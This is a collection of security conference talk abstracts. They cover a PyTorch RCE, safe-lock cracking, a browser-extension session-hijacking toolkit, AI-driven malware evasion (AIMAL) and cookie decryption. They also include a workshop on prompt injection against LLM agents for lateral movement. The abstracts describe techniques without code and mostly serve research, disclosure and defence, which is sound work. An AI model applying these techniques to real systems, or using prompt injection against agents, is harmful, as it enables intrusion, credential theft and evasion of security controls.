<p>For years, the security of weights_only=True remained unchallenged. Our research, however, uncovered unsettling truths. We discovered that torch.load with weights_only=True supports TorchScript, leading us to delve into TorchScript's inner workings. After a period of research, we discovered several vulnerabilities and ultimately achieved RCE. We promptly reported this finding to PyTorch, who acknowledged the vulnerability and assigned us CVE-2025-32434. This revelation overturns established understandings and has profound implications for numerous AI applications. We will provide an in-depth analysis of the impact of this vulnerability.</p>

<p>In this sharing, we will introduce how we gained inspiration and discovered this interesting vulnerability. Meanwhile, our findings once again confirm the statement, ""The Safe Harbor you once thought was actually Hostile Waters.""</p>

Our talk will cover the vulnerabilities we found and journey into the various families of locks made by SecuRam, the OEM of safe locks used by Liberty Safe and other Safe vendors.
Our exploration began with an âanalogâ lock from Liberty Safe but quickly expanded to SecuRamâs âdigitalâ lock lines, where we found a debug port that allowed access to all firmware and data. Through this, we discovered that codes are stored on the externally accessible keypad, rather than securely inside the safe (as well as other issues).
These locks, deployed widely in consumer, and commercial safes at major retail chains exhibit vulnerabilities that enable opening them in seconds with a Raspberry Pi.
We invite you to our session to see us crack UL-certified High-Security Electronic Locks live!</p>

<p>The 2023 loss of the Titan submersible was a tragic wake-up call that exposed dangerous gaps in safety oversight, design practices, and regulation in extreme maritime environments. As leader of the international search-and-rescue response, I witnessed firsthand the human consequences of operating innovative technologies in legal gray zones without sufficient safeguards. Titan's creators leveraged regulatory loopholes to push design boundaries, dismissing expert warnings and bypassing standard safety certifications. This same pattern of unchecked innovation, inadequate oversight, and hubris mirrors critical vulnerabilities now facing maritime cybersecurity. Just as Titanâs passengers unknowingly placed trust in untested designs, vessels today rely increasingly on digitally interconnected yet inadequately secured systems, creating risks that could lead to catastrophic failures. Harsh environmental conditions and remote operations compound the potential impacts of maritime cyber incidents, paralleling Titanâs tragic fate. This paper connects the painful lessons from the Titan tragedy to urgent maritime cybersecurity needsâarguing for clear international regulation, rigorous independent testing, and proactive incident response planningâto prevent similar disasters at sea.</p>

<font size=""+1""><strong>Description:</strong></font><br>
Imagine one sunny morning you read the news: A crypto worm targets 100+ organizations around the world. The authorities estimate that during the first days of attack ~28,000 hosts in 158 countries were affected, including 24 nation state and European union assets, major banks and tech companies. Since then, the worm has spread and is now everywhere. The industry doesn't know the main source of attack. There are many backdoored artifacts reportedly used by the victims with no obvious connections.<br />

<p>Eventually, a security researcher connects all dots and finds the source: compromised, abandoned AWS S3 buckets. The risk that researchers warned in the past materialized on a truly gigantic scale, 5155 buckets were affected.</p>

<p>Luckily, this incident has never happened. The buckets used in that hypothetical scenario were claimed by a security researcher and taken down by the Cloud provider. </p>

<p>In this talk, we will dissect the anatomy of such an attack. We will show that adversaries equipped with instruments of big data analysis and custom LLM-agents can take these scenarios to the next level by automating and scaling them. We will share statistical insights and 9 concrete stories illustrating potential victim profiles and attack vectors. Finally, we will discuss remediation actions that would eliminate the risk once and for all.</p>

<p>Copycat is a browser extension-based red team toolkit for simulating web-based identity attacks. This tool simulates ten web-based identity attacks through a single browser extension with minimal permissions, operating primarily through hidden windows that execute attacks without user awareness. With Copycat, red teams can simulate complex attack scenarios including silent Gmail and LinkedIn hijacking, credential theft through login and OTP stealing, login page redirection, autofill extraction from enterprise applications, and multiple OAuth manipulation techniques. Copycat runs entirely in-browser with no special hardware requirements. Red teams can use Copycat to demonstrate attack vectors that bypass EDRs, SASE, and other traditional security controls, as these techniques operate within legitimate authenticated sessions rather than breaking them. The tool is fully modifiable, with each module designed for customization to target different services or authentication flows. Source code and documentation will be available for security researchers to extend and improve the framework. Special mention to Pankaj Sharma, Tejeswara S. Reddy, and Arpit Gupta for their contributions in building this toolkit!</p>

<p>Latin America has a distinct cyber threat landscape, presenting a fragmented and heterogeneous IT infrastructure with often outdated systems, limited cyber maturity, and budget constraints converge, making it an ideal playground for cyberattacks.<em>x000D</em>
<em>x000D</em>
While ransomware is a global concern, in LATAM, threat actors enjoy extended dwell times, silently navigating networks, studying victim environments, and maximizing damage before encryption is deployed. This not only increases the success rate of the attacks but also enables operators to maintain persistence or monetize access by reselling it. The monetization of unauthorized access has become a growing market in Latin America, often just as profitable as ransomware deployment itself.<em>x000D</em>
<em>x000D</em>
The ransomware ecosystem has expanded significantly with business models like Ransomware-as-a-Service (RaaS). From Latin America, a region where the primary motivation for cyberattacks is financial, it's possible to see a different perspective on this ecosystem.<em>x000D</em>
<em>x000D</em>
This talk dives deep into the evolving ransomware threat landscape across LATAM, where attackers benefit from its unique landscape. We'll explore the TTPs of the most active ransomware families in the region,  RaaS operations, prolonged Intrusions, and regional adaptations. Through technical analysis and regional case studies, weâll highlight how ransomware operators are adapting to exploit legacy infrastructure, regional geopolitics, and socioeconomic realities.<em>x000D</em>
<em>x000D</em>
The topics covered will include:<em>x000D</em>
*Brief overview of the LATAM ransomware threat landscape.<em>x000D</em>
*Most active ransomware and RaaS families targeting LATAM, interesting and relevant case studies.<em>x000D</em>
*Analysis of common TTPs and attacker behavior in LATAM ransomware intrusions.<em>x000D</em>
*Socio Economic and geopolitical factors that influence attacker operations in the region.<em>x000D</em>
*Monetization strategies beyond encryption: access resale, data exfiltration, and extortion trends.</p>

The attackers distributed a trojanized version of KeePass through Bing malicious advertisements, leveraging fake download pages to lure unsuspecting victims searching for the software. The modified binary retained full KeePass functionality, making it nearly indistinguishable from the legitimate version. Behind the scenes, it acted as a stealthy loader, ultimately deploying a Cobalt Strike BEACON to establish persistent access.</p>

<p>Banking Trojans targeting Windows systems have been affecting users in Latin America for many years, with their peculiarities in the tactics, techniques and procedures used by the criminals responsible for their development. However, it was not until the early 2020s that massive campaigns began to be detected with targets outside their usual region of operation, with special emphasis on Spain and Portugal. Since then, these campaigns have not ceased and several malware families have evolved to try to be more effective, with several different criminal groups collaborating in several of these campaigns and sharing their infrastructure. Through all this years many researchers at both sides of the Atlantic ocean have worked together to gather intel that could help to take down these cybercriminal organizations with some important achievements. The goal for this presentation is to analyze the reasons why the criminals behind these threats have been successful despite the increase in online banking security measures, while revealing the latest results obtained after analyzing the most recent campaigns of these threats. We will provide several examples of campaigns used by these malware families and how they are trying to adapt to keep being successful in obtaining new victims.</p>

<p>Traditional RFID badge cloning methods require you to be within 3 feet of your target. So how can you conduct a physical penetration test and clone a badge without interacting with a person? Companies have increasingly adopted a hybrid work environment, allowing employees to work remotely, which has decreased the amount of foot traffic in and out of a building at any given time. This session discusses two accessible, entry-level hardware designs you can build in a day and deploy in the field, along with the tried-and-true social engineering techniques that can increase your chances of remotely cloning an RFID badge.</p>

<p>Langston and Dan discuss their Red Team adventures using implant devices, a Flipper Zero and an iCopy-X. As a bonus the two will explain how to perform a stealthy HID iClass SE/SEOS downgrade and legacy attack! This presentation is supplemented with files and instructions that are available for download in order to build your own standalone gooseneck reader, wall implant and clipboard cloning devices!</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>AIMAL (Artificially Intelligent Malware Launcher) is a modular red team framework built to simulate advanced malware evasion techniques against modern AV/EDR/IDS solutions. It supports Process Herpaderping, Process Hollowing, Thread Hijacking, Process Ghosting, and many other Evasion Techniques as delivery mechanisms, with stealth enhancements including PPID 
spoofing, shellcode polymorphism, syscall mutation (Hellâs Gate), and aggressive AMSI/ETW bypassing. AIMAL adapts to simulated detection responses through a feedback loop that mutates behavior on the fly â rotating techniques until the payload bypasses detection. Integration with the OpenAI API allows AIMAL to suggest the best evasion strategy based on alert context, helping simulate the decision-making process of advanced threat actors. Designed for research, red teaming, and adversarial simulation, AIMAL brings real-world stealth techniques  into an intelligent feedback-driven system that learns and adapts like an evolving threat. Whether used for red team drills or research into next-gen evasion, AIMaL demonstrates how AI can weaponize malware beyond static signatures and into dynamic decision-making.</p>

<p>This process is not just about executing code â itâs about demonstrating how 
real malware adapts. The user is taken through a full offensive simulation 
workflow:
 1. AIMAL prints a stylized menu with ET options.
 2.The user selects an evasion technique (e.g., Process Herpaderping).
 3. The user selects a payload (e.g., reverse shell).
 4. AIMAL copies and prepares the full module structure (not just EXEs).
 5. The user simulates a detection alert type and string.
 6. AIMAL uses OpenAI to suggest a bypass strategy.
 7. The user can authorize AIMAL to automatically:Addjunkfunctions (hash evasion), Inject stealth upgrades (e.g., call RandomNoise(), add extra PolymorphShellcodeAfter()), Apply PPID spoofing or syscall mutations, Rebuild, mutate and repack the payload.</p>

<p>AIMAL has already demonstrated success against multiple AVs. Using static 
stealth alone, it bypassed both signature and behavioral detection of Windows 
Defender and McAfee. Bitdefender and Kaspersky were bypassed on static 
signatures; after OpenAI integration, AIMAL also defeated their behavioral 
detection.</p>

<p>We have exposed critical offensive capabilities in the <code>azbridge</code> tool, which has been available in Microsoft Azure's GitHub repository since 2018. This tool is a legitimate utility connecting network-isolated assets. Our research demonstrates how an attacker can weaponize this tool using its default configuration.</p>

<p><code>azbridge</code> supports attackers in establishing covert C2 channels, exfiltrating data, and enabling lateral movement while evading scrutiny by perimeter defenses. It leverages back-end services that serve Azure Relay endpoints (<code>*.servicebus.windows.net</code>) and encapsulates malicious traffic in TLS-encrypted connections to <code>*.cloudapp.azure.com</code> endpoints, defeating egress filtering and proxy inspection.</p>

<p>We demonstrate how attackers can use it to maintain persistent network access, bypass network security controls, and conduct post-exploitation using Microsoft's tool. More sophisticated adversaries can re-implement the functionality of this tool in their tradecraft (e.g., implants). For our defensive side friends, we provide initial recommendations on recognizing these techniques to defend against adversaries exploiting legitimate infrastructure.</p>

<p>While not a 0-day, as of 03/14/2025, there are no reports of adversaries using <code>azbridge,</code> and no researchers have reported this toolâs potential for abuse. Therefore, we believe it is a novel use case or at least one that has not been publicly discussed.</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>While there is increasing content on attacking LLMs hitting the Internet (and at DEFCON), much of it is focused on attacking LLMs from more of a penetration-test perspective without putting the attacks into the broader context of a Red Team operation. As with any technology that we encounter in a network during a Red Team exercise, we should be familiar with how to use it to achieve goals like lateral movement or privilege escalation. Like it or not, in the near future that will increasingly include LLM-based applications and agents.</p>

<p>This session aims to close that gap. The speakers will start with some entry-level theory on how LLMs function under the hood. No math experience? No problem. We're going to keep things at a nice, high level with special focus on the core functionality of LLMs that enables attacks.</p>

<p>After addressing the theory, the speakers will shift to real-world attacks on LLMs drawn from our operations. This will take two forms: strategies to break LLMs through direct and indirect prompt injection, and ways to take a successful prompt injection and turn it into progress toward your Red Team objectives like enumeration, lateral movement, privilege escalation, or execution.</p>

<p>With the groundwork laid, the workshop will close with a hands-on, multi-level CTF for participants to try some of the direct and indirect prompt injection strategies discussed in the workshop.</p>

<p>Detailed Agenda:
1. Introductions (2 mins)
2. Theory: 
    a. Neural Networks (10 mins)
    b. LLMs (10 mins)
3. Attack Strategies (15 mins)
    a. Direct prompt injection strategies + war stories
    b. Indirect prompt injection strategies + war stories
4. Hands-on CTF (20 mins)
5. Q&amp;A (remainder)</p>

NOTE: There is an accompanying tactic that goes along with this workshop which will begin after the workshop completes.<br />

<p>This session explores advanced security mechanisms implemented by major browsers to prevent cookie theft from their storage databases. Chrome has recently implemented AppBound encryption, which provides multi-layered protection for session cookies:</p>

<p>1) A 2-way DPAPI encryption system that operates with both elevated NT AUTHORITY\SYSTEM permissions and normal user-level decryption capabilities;</p>

<p>2) A state-key encryption layer utilizing the ChaCha20Poly1305 algorithm with custom keys (that once was AES-256-GCM encrypted);</p>

<p>These implementations have significantly reduced the effectiveness of info-stealing malware. However, this session will demonstrate potential vulnerabilities in these security measures and explain how to obtain decrypted cookies despite these protections. We will examine the new format specifications and encryption methodologies for cookies.</p>

<p>Beyond Chromium-based browsers, we'll explore Gecko's encryption algorithms, which involve structured ASN.1 data formats with multiple encryption schemes including 3DES and AES-256. We'll also analyze Chromium on macOS which relies on PBKDF2 key derivation, and WebKit-based browsers that store cookies in binary cookie files.</p>

<p>Additionally, we'll discuss Chrome's forthcoming ""Device Bound Session Cookies"" (DBSC) technology, which aims to further mitigate session hijacking through cookie theft by implementing TPM chip-based encryption and requiring proof of possession of the cryptographic key.</p>

SeVa aims to provide an accurate triage and priority framework for secrets with below philosophy:<br />
1) Secrets which are confirmed to be valid will be of most priority<br />
2) Secrets which are confirmed to be not valid will be of least priority<br />
3) Remaining secrets will have severity as per triage<br />

<p>SeVa has three primary independent modules:
1) Connector - To connect with a secret source and fetch the details, support major secret scanners
2) Enhancer - This module identifies the secret type and what additional information is required to make a decision on validation as defined above. It also fetches the complimentary information from affected area
3) Validator - This engine validates the secrets and makes the decision on secret validity and provides the output in multiple formats</p>

<p>SeVA provides a fast and noninvasive way to verify credentials with non-intrusive API calls without secrets leaving organization infrastructure. It can be adopted as easily as writing a GitHub Action workflow. </p>

<p>Not every team has a security budget. Not every project has a dedicated AppSec engineer. But every product exposed to the internet needs some level of security to survive.</p>

<p>This talk explores what I call âThe AppSec Poverty Lineâ also known as âMinimal Viable Securityâ â the minimum viable set of practices, tools, and cultural shifts that under-resourced dev teams can adopt to meaningfully improve application security. Whether you're a startup with no security hires, an independent dev, or part of a team that doesnât have a security budget, this talk will help you prioritize what actually matters.</p>

<p>Weâll cover practical approaches to getting from zero to secure-ish, with a focus on:
    â¢   Training developers to write more secure code, and spot unsafe code
    â¢   Cultivating a security-positive culture
    â¢   Leveraging open-source tools that punch above their weight
    â¢   Knowing when âgood enoughâ really is enough â and when itâs not</p>

<p>This year, weâll be discussing topics like:
* The constant march of incidents and assume breach has transcended clicheâ what are you doing to keep yourself and your crew sane?
* Where are you investing right now to detect and block with nation state adversariesâ whatâs working and what hyped methods are a waste of time?
* Speaking of cliches, too many alerts, not enough people and timeâ yes, we need to tune, but what are we doing to win here?  Is it sustainable?  Should we give up on conventional detection?
* Letâs talk about generative AIâ where are you seeing SOC actually use it, and where do you think weâre still a ways off?
* Return to office- we hear about it in the news, but is it realistic?  Does RTO preclude world class talent?</p>

<p>In this engaging talk, we will embark on a journey through the trials and triumphs of constructing a 100% serverless, scalable security platform. Starting about 2 years ago when we bootstrapped Jit, we will share all the lessons we have learned along the way to build our platform - both in terms of people and technology.Â </p>

<p>As we venture into the land of serverless architecture, we will discuss its power but also confront the myth that less hardware equates to fewer headaches. Spoiler alert: it doesn't, but the lessons learned are invaluable. Takeaways: Serverless has become an excellent way to ramp up infrastructure operations for cloud first companies. However, this comes with its own set of security challenges, including the popular OWASP Top 10. In this talk, we will dive into what it takes to build a real world secure and scalable serverless platform for your engineering.</p>

Abstract:<br />
==========<br />
Google Cloudâs Identity-Aware Proxy (IAP) is often seen as the final gatekeeper for internal GCP services - but what happens when that gate quietly swings open? This session uncovers how subtle misconfigurations in IAP can lead to serious data exposure, even in environments with no public IPs, strict VPC Service Controls, and hardened perimeters. Weâll introduce a new vulnerability in IAP that enables data exfiltration, allowing attackers to bypass traditional network controls entirely, without ever sending traffic to the public internet. In addition, weâll walk through real-world examples of overly permissive IAM bindings, misplaced trust in user-supplied headers, and overlooked endpoints that quietly expand the attack surface. Attendees will gain a deeper understanding of IAPâs internal workings, practical detection strategies, and a critical perspective on trust boundaries in GCP.<br />

<h1 id=""description:"">Description:</h1>

<p>This talk delivers a technical dive into Google Cloudâs IAP, a service widely used to enforce access controls on internal applications - and often assumed to be foolproof. We begin with a concise overview of how IAP works behind the scenes, including its identity enforcement model and how it integrates with IAM and backend services.</p>

<p>The core focus is on teaching defenders how these misconfigurations manifest in logs once an attacker begins to exploit them, equipping them to build effective detections and stop breaches before they escalate. Whether itâs during the initial configuration tampering or while actively bypassing controls, Iâll walk through what those activities actually look like in GCP logs. For each misconfiguration, Iâll present real log snippets, unpack the most revealing details, and show how to correlate signals, even those outside of IAP-specific logs, to detect and investigate IAP abuse effectively.</p>

<p>The highlight of the session is a new research technique we've developed: exploiting IAP's CORS behavior to exfiltrate sensitive data using preflight OPTIONS requests, effectively bypassing traditional network egress controls. This method can succeed even in highly restricted environments with no internet access, no public IPs, and VPC Service Controls fully enforced. The issue has been responsibly disclosed to Google and is currently under review, with an expected review timeline of 30 days.</p>

<p>Weâre sharing this research to highlight just how fragile IAP configurations can be, where even a minor misstep or overlooked setting can unintentionally expose internal resources to the internet. Alongside the technique, weâll provide practical detection strategies to help defenders identify this specific attack vector through GCPâs logging infrastructure.</p>

<p>Weâll wrap up with detection strategies using GCP logs to identify abuse patterns, surface subtle signs of exploitation, and improve monitoring around one of GCPâs most sensitive gateways.</p>

<p>As cloud infrastructure becomes a prime target for adversaries, defenders must evolve their detection capabilities to stay ahead. Join us for an immersive, hands-on workshop where weâll emulate real-world attacker behaviours and build compelling detection logic using Azure-native logs and tools.</p>

<p>This workshop introduces participants to Azure's control and data plane logging systems, the visibility gaps in API-based detection, and how Microsoft Sentinel can be leveraged for threat detection using KQL. Participants will first explore the landscape of Azure telemetry, including log tables like AzureActivity, AuditLogs, SigninLogs, and MicrosoftGraphAPI, to understand whatâs availableâand whatâs missingâwhen trying to detect threats in the cloud.</p>

<p>The core of the session is focused on executing and detecting high-impact TTPs such as:</p>

<p>Unauthorised use of Azure CLI</p>

<p>Run Command Abuse on virtual machines</p>

<p>Mass blob reads and deletions</p>

<p>Malicious Key Vault access attempts</p>

<p>Through guided simulations, attendees will perform these actions in a dedicated Azure tenant, then pivot to the defender side to query relevant logs using Kusto Query Language (KQL), surfacing anomalies, and crafting detections.</p>

<p>Whether you're a cloud defender, threat hunter, or detection engineer, this session offers a rare opportunity to simulate adversary behaviour and refine detection strategies in a realistic Azure environment. By the end of this workshop, youâll leave with practical KQL queries, detection playbooks, and hands-on experience in defending cloud infrastructure against modern threats.</p>

<p>Tenant Deployment Instructions:</p>

<p>Each participant will receive access to a pre-provisioned Azure tenant with the necessary services (including virtual machines, storage accounts, Key Vaults, function apps, and AKS clusters) already deployed and configured. Diagnostic settings will be pre-enabled to stream control and data plane logs into Microsoft Sentinel for immediate use.</p>

<p>Furthermore, all participants will deploy their Azure tenants through the TryHackMe platform, where credentials will be automatically provisioned. This streamlined setup ensures secure, consistent access for all attendees. Additional browser-based consoles will be provided directly within the TryHackMe environment to support hands-on activities, eliminating the need for local installation.</p>

<p>When a company gives vendors access to its technical garden to process personal data, itâs the companyâs responsibility to ensure vendors have adequate protections in place. Data protection/processing agreements (DPAs) are a control companies use to contractually obligate and specify what adequate protections vendors must have and to outline the consequences if vendors fail to protect the personal data. Propagating the right DPAs with vendors prevents invasive species from taking root in a companyâs technical garden. Gardeners who attend this talk will walk away with a high-level understanding of: (a) how DPAs can be used to protect your companyâs technical garden, (b) what information privacy/legal needs to know when negotiating a DPA, and (c) which DPA terms are roses to be cultivated or weeds to be removed.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In 2023, Microsoft detected a nation state actor (Forest Blizzard/STRONTIUM) exploiting a ""zero-click"" remote code execution vulnerability in Outlook by sending a malicious email. Microsoft fixed this in part by adding a call to the MapUrlToZone API, which determines where a path is located so callers can make a trust decision. Critical components like Outlook, Office, Windows Shell and sandboxes rely on MapUrlToZone to make intelligent security decisions, but little research has historically focused on MapUrlToZone itself. Microsoft Security Response Center has a unique role in analyzing systemic trends in areas like this and drive deep technical research to remediate security issues. 
This talk will focus on MSRC's review of the MapUrlToZone API which identified several novel ways to trick Windows into thinking that a remote untrusted file exists on the local machine.  We will talk about how we approached this research and exploited key differences in how MapUrlToZone and the Windows filesystem parse file paths.
In total, this research identified a dozen CVEs across various vulnerability types. All of the issues covered have been fixed with CVEs in early 2025. In addition to the individual fixes for this component, we'll also cover how MSRC worked with internal teams to build more comprehensive mitigations.</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>Is there a security boundary between Active Directory and Entra ID in a hybrid environment? The answer to this question, while still somewhat unclear, has changed over the past few years as there has been more hardening of how much âthe cloudâ trusts data from on-premises. The reason for this is that many threat actors, including APTs, have been making use of known lateral movement techniques to compromise the cloud. In this talk, we take a deep dive together into Entra ID and hybrid trust internals. We will introduce several new lateral movement techniques that allow us to bypass authentication, MFA and stealthily exfiltrate data using on-premises AD as a starting point, even in environments where the classical techniques donât work. All these techniques are new, not really vulnerabilities, but part of the design. Several of them have been remediated with recent hardening efforts by Microsoft. Very few of them leave useful logs behind when abused. As you would expect, none of these âfeaturesâ are documented. Join me for a wild ride into Entra ID internals, undocumented authentication flows and tenant compromise from on-premises AD.</p>

<p>The LaunchAnywhere vulnerability has long been a significant concern in Android security, allowing unprivileged applications to invoke protected activities, even with system-level privileges, and have been actively exploited in the wild in the past.</p>

<p>In response, Google and device vendors have implemented patches, primarily by introducing destination component checks within privileged code before launching Intents. These fixes appeared to have mitigated such risksâat least on the surface. But has the threat truly been eliminated?</p>

<p>In this session, we demonstrate that these defenses remain insufficient. We introduce a new exploitation technique, BadResolve, which bypasses these checks through multiple methods, enabling a zero-permission app to achieve LaunchAnywhere once again. We reveal high-severity vulnerabilities that affect all Android versions, including the latest Android 16 (at time of writing), which have been confirmed and patched by Google. Dead, made alive againâ we show how the LaunchAnywhere vulnerability has been reborn. In addition to presenting new exploitation techniques, we tackle the challenge of efficiently and accurately identifying methods in the vast codebases of AOSP and vendor-specific closed-source implementations that could be exploited by BadResolve, using LLM Agents and MCP.</p>

<p>You patch vulnerabilities, sandbox malware, and audit code. You know not to click suspicious links. But what if the real threat isn't in phishing emails or zero-daysâbut in the very tools and research you're relying on? In late 2024, we uncovered a new threat actor, MUT-1244, targeting security professionals, red teamers, and academics. They use trojanized proof-of-concept exploits and fake software updates to exploit trust in open-source tools and research environments.</p>

<p>During our investigation, we discovered over 390,000 leaked credentials that MUT-1244 exfiltrated from a compromised actor, revealing the scale of their operation. In this talk, we'll reveal how MUT-1244 operates through fake GitHub profiles and showcase our use of OSINT to map their infrastructure and tactics. We'll also share our attribution findings and methodology.</p>

<p>Attendees can expect to hear technical details of the campaigns conducted by this threat actor, some notes on attribution, ideas for detecting this activity in your environment and the story of how the speakers discovered over 390,000 credentials inadvertently stolen from unrelated threat actors by MUT-1244.</p>

<p>Have I Been Ransomed? is a specialized security service, akin to Have I Been Pwned, designed to detect personal data exposure specifically from ransomware leaks. As ransomware attacks increasingly involve data theft and public dumping, individuals need a way to check if their personally identifiable information has been compromised. Our platform goes beyond standard database checks by processing a wide array of leaked file types, including PDFs, documents, and text files. We employ advanced optical character recognition coupled with sophisticated large language models to meticulously scan unstructured data and extract sensitive identifiers such as national ID cards, driverâÃÃ´s licenses, and social security numbers. Have I Been Ransomed? provides critical awareness, empowering users to discover if their sensitive information has been exposed in a ransomware incident and enabling them to take proactive steps against potential identity theft and fraud.</p>

<p>Any chip of sufficient complexity needs one thing if they want to actually get used in devices - a Software Development Kit (SDK). This collection of binaries, proprietary services, and code samples allows board designers to quickly and easily incorporate an otherwise complex chip into their existing environments. However, once this code is bundled into various product lines from various vendors, it becomes nearly impossible to make sure it gets updated with new versions. What happens if a vulnerability is discovered? Suddenly, hundreds of thousands of devices all from different vendors spanning years of releases are all affected by the same bug and it turns into a perpetual game of whack-a-mole trying to get them all patched. And botnet authors are definitely paying attention. In this talk, we will discuss the attack surfaces present in the SDKs from some major chipset manufacturers, talk about some exploits (both old-day and 0-day), and try to figure out what can be done to cleanse the internet of the zombie SDK vuln plague.</p>

<p>Malware written in Go is becoming more common and more challenging to deal with. Go binaries are large, packed with statically linked code, and structured in ways that confuse traditional reverse engineering tools. The Go runtime introduces additional layers of complexity, making tasks like function identification, string recovery, and behavior tracking harder than usual.<em>x000D</em>
<em>x000D</em>
EDRs also struggle with Go malware. Unusual binary layouts, obfuscated strings, and non-standard execution flows can lead to missed detections and incomplete telemetry.<em>x000D</em>

In this talk, we will break down the key challenges in analyzing Go malware and share tools and techniques that help make sense of it. We will also walk through a recent sample called FrostyGoop, which was used to disrupt heating systems in Ukraine. By examining its structure, behavior, and unique artifacts, we will show how attackers are using Go in real-world campaigns and what defenders can do to catch up.</p>

If you're curious about what NixOS can do for your homelab, or even if you're just worried about SBOMs or traceability of exactly where your software and all its dependencies came from, join us for an hour-long panel about how we can reclaim our services and software from vendor lockin and Docker image bitrot using Nix and NixOS. We'll be doing a deep dive into why Nix changes software deployment, and how you can get started and get involved in the quiet revolution that has been reshaping how we use software.</p>

<p>Life-long engineer. Worked at Google, flew jet planes in the Marine Corps, trained cyberware teams, formed and led teams to perform rapid hardware and software capability development, worked with the Digital Service to bring modern software practices to the DoD and government. Left the service to create a contracting startup bringing AI/ML products to DoD. Throughout have found a consistent set of challenges in the course of development; also found a set of superpowers to address those challenges using Nix. After several iterations of applying the Nix ecosystem in various teams, the difference was stark. This led to the desire to bring this set of superpowers to the rest of the world and make it more adoptable; hence the involvement in the Nix community as a maintainer, founding Flox, and leading efforts to improve user experience and communicate it to the world.</p>

<p>IP blocklists rot in minutes; fingerprints persist for months. Finch is a lightweight reverse proxy that makes allow, block, or route decisions based on TLS and HTTP fingerprints (JA3, JA4, JA4H, and HTTP/2), before traffic reaches your production servers or research honeypots. Layered on top, a custom AI agent monitors Finchâs event stream, silences boring bots, auto-updates rules, and even crafts stub responses for unhandled paths; so the next probing request gets a convincing reply. The result is a self-evolving, fingerprint-aware firewall that slashes bot noise and turns passive traps into dynamic deception.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>When Russia launched its full-scale invasion of Ukraine in February 2022, scholars and archivists were concerned that if the web presence of Ukraine's cultural heritage institutions (libraries, archives, museums, and other community organizations) fell into Russian hands, Putin's vision for rewriting Ukrainian history could become reality. Saving Ukrainian Cultural Heritage Online (SUCHO) started as a rapid-response data rescue effort to archive these websites in a distributed way to ensure no single point of failure could delay the project working around the clock. Access was a priority in choosing a tool suite, to accommodate a volunteer pool that expanded to include elders and children. This talk reflects on the several threads of access that SUCHO has focused on, including managing security/privacy concerns, getting physical hardware to organizations in a war zone, providing a platform for publishing newly digitized material, and preserving/annotating the ephemeral cultural heritage of war memes. Since January 2025, the hypothetical concerns that drove SUCHO have become a reality in the context of US government websites and datasets. The talk concludes with lessons learned over the course of SUCHO that shape the work that SUCHO ""alumni"" are currently doing to ensure ongoing access to at-risk data in the US.</p>

<p>Quinn Dombrowski is one of the co-founders of Saving Ukrainian Cultural Heritage Online (SUCHO), and an Academic Technology Specialist in Stanford's Division of Literatures, Cultures, and Languages, and in Stanford Libraries. Given a computer lab to manage in 2018, Quinn got rid of the ancient computers, bought some sewing machines, and put up a sign calling it the Textile Makerspace. Then people started to believe it, and fund it, and now Quinn teaches Data Visualization with Textiles there every spring and manages a space full of sewing machines, looms, crochet hooks, and multiple hacked digital knitting machines. Quinn has served as co-president of the Association for Computers and the Humanities (the US-based organization for Digital Humanities), and founded The Data-Sitters Club, a project that walks through, step-by-step, how to use different computational tools and methods for literature. They have incorporated textile data encoding into their work in various forms, including weaving all the data (grading, attendance, readings, complaint emails) from an AI class they taught, knitting all regularly-scheduled meetings and when they were canceled in 2022, and visualizing the distribution of references to computers, librarians, and archives across ""Star Trek"" novels.</p>

<p>What if you bypass SSIDs, association handshakes, IP, and every ""normal"" layer of Wi-Fi, and just sling raw 802.11 frames? With Scapy and two USB WiFi adapters, I'll demonstrate four bite-sized hacks that treat Wi-Fi as a blank RF pipe. No access point required.</p>

<p>Raw 802.11 File Drop: A wink to the fruit company's file-beam trick. Hurl a PDF into the airwaves and catch it on a friend's laptop. No pairing or IP required.</p>

<p>Walkie-talkie: Embed a PCM audio stream in raw broadcast frames. No association needed.</p>

<p>Meshtastic-over-Wi-Fi: Repackage the popular LoRa mesh-chat protocol into 802.11 frames for hop-to-hop messaging at Wi-Fi speeds.</p>

<p>WiFiFS: A FUSE filesystem mapping RF traffic to files. You can cat, cp, or grep packets as they fly by.</p>

<p>Each script is short enough to skim while your espresso shot pulls, light on dependencies, and leaves ordinary clients blissfully unaware of the mischief on channel 6. You'll walk away with working code, a new mental model of 802.11 as raw clay, and plenty of inspiration to craft your own oddball protocols. No access points, just DIY frame-level fun.</p>

Whether supporting a remote dropbox deployment or a distant ham shack, this solution enables encrypted shell access and configuration changes using a low-cost ($25) LoRa radio over extended ranges. Although not intended for high-bandwidth tasks, it provides an efficient platform for debugging, troubleshooting, and command execution in constrained network conditions. Furthermore, by utilizing the existing Meshtastic mesh, users can often avoid the complexity of building a dedicated network.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>This presentation will describe the history and significance of the California Top to Bottom Review (TTBR), the landmark study of voting systems whose report disclosed many serious security vulnerabilities in the systems used in California and led to changes in the systems certified for use in that state. The talk will also cover that studyâs lesser-known but equally important cousin, the Post Election Audit standards Working Group, whose report gave rise to the fundamental concept of risk limiting audits (RLAs).</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Debra Bowen, The Honorable<br>
<p>Debra Bowen was the elected Secretary of State of California for two terms from 2007 to 2015. Prior to that, from 1992 to 2006, she had been a member of the California Assembly and then the Senate.  In 2007, at the beginning of her term as Secretary of State, she commissioned the Top to Bottom Review (TTBR) of voting systems used in California. The review involved top computer security researchers, attorneys, and accessibility experts, and provided the nation with an unprecedented view into the state of voting machines. The TTBR led to critical changes to improve Californiaâs elections and influenced other states to move away from the most insecure voting systems. In parallel she commissioned the Post Election Audit Standards Working Group (PEASWG), a group of experts charged with outlining standards for election auditing. From their report emerged the very first formal description of what came to be known as risk-limiting audits (RLAs), now widely viewed as the âgold standardâ of auditing techniques. RLAs make the notions of evidence-based elections and software independence, two of the fundamental pillars of election integrity, an achievable goal.For her âbold leadership and her steadfast resolve to protect the integrity of the voteâ she was honored with a 2008 Profile in Courage Award by the John F. Kennedy Presidential  Library and Museum.</p>

<p>Incident response often feels like drowning in a sea of logs. While LLMs promise a lifeline, simply dropping a chatbot into a DFIR tool is not enough.</p>

